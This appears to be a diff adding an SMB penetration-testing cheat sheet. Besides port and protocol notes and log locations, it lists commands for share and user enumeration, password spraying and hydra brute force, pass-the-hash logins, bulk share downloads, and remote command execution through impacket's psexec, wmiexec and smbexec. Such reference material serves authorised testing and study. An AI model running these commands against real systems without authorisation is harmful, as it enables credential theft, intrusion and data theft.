@@ -1,0 +1,103 @@
+==============================
+SMB (Server Message Block)
+Cheat Sheet – Professional
+==============================
+
+PORTS:
+445/TCP – SMB over TCP (modern)
+139/TCP – SMB over NetBIOS (legacy)
+137/UDP – NetBIOS Name Service
+138/UDP – NetBIOS Datagram
+
+RFC / SPECS:
+CIFS / SMBv1 (deprecated)
+SMBv2
+SMBv3 (encryption, signing)
+
+Transport:
+TCP (primary)
+UDP (NetBIOS legacy)
+
+--------------------------------
+1. BASIC ENUMERATION
+--------------------------------
+
+nmap -p139,445 <IP>
+nmap -p445 --script smb-* <IP>
+nmap -p445 --script smb-os-discovery <IP>
+nmap -p445 --script smb-protocols <IP>
+nmap -p445 --script smb-enum-shares,smb-enum-users <IP
+nmap -p445 --script smb-vuln* <IP>
+
+smbclient -L //<IP>/ -N
+rpcclient -U "" <IP>
+rpcclient -U "%" <IP>
+
+# Enum via rpcclient
+enumdomusers
+enumdomgroups
+querydominfo
+getdompwinfo
+
+# List shares
+smbclient -L //<IP> -N
+smbmap -H <IP>
+
+# Authenticated share enum
+smbmap -H <IP> -u user -p pass
+smbmap -H <IP> -u user -p pass -R
+
+# Connect to share
+smbclient //<IP>/<share> -N
+smbclient //<IP>/<share> -U user
+
+crackmapexec smb <IP>
+crackmapexec smb <IP> -u user -p pass
+crackmapexec smb <IP> --users
+crackmapexec smb <IP> --rid-brute
+crackmapexec smb <IP> -u users.txt -p 'Password123'
+
+enum4linux-ng -A <IP>
+enum4linux-ng -R <IP>
+
+hydra -L users.txt -P pass.txt smb://<IP>
+crackmapexec smb <IP> -u user -H <NTLM_HASH>
+
+smbmap -H <IP> -R
+
+smbclient //<IP>/<share>
+> get file.txt
+> recurse ON
+> prompt OFF
+> mget *
+
+crackmapexec smb <IP> -u user -p pass --exec-method smbexec
+crackmapexec smb <IP> -u user -p pass -x "whoami"
+
+psexec.py user@<IP>
+wmiexec.py user@<IP>
+smbexec.py user@<IP>
+
+nmap -p445 --script smb-vuln-ms17-010 <IP>
+nmap -p445 --script smb-security-mode <IP>
+nmap -p445 --script smb-enum-shares,smb-enum-users <IP>
+
+Linux:
+ /var/log/samba/
+ log.smbd
+ log.nmbd
+
+Windows:
+ Event Viewer
+ Security Logs
+ SMBClient / SMBServer logs
+
+smbclient
+smbmap
+rpcclient
+crackmapexec
+hydra
+nmap
+impacket (psexec, wmiexec, smbexec)
+metasploit
+s check NULL session first
